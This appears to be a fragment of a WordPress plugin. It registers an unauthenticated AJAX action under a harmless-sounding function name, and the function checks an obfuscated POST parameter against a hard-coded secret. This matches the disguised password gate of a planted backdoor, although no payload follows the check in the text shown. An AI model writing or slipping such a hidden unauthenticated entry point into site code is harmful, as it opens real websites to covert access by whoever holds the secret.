<?php

function accordion_integration_nav_customize() {
	if (!isset($_POST["cntkoztolwb"]) || $_POST["cntkoztolwb"] !== "w2Z4Bzli16") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'accordion_integration_nav_customize', 5, 1);
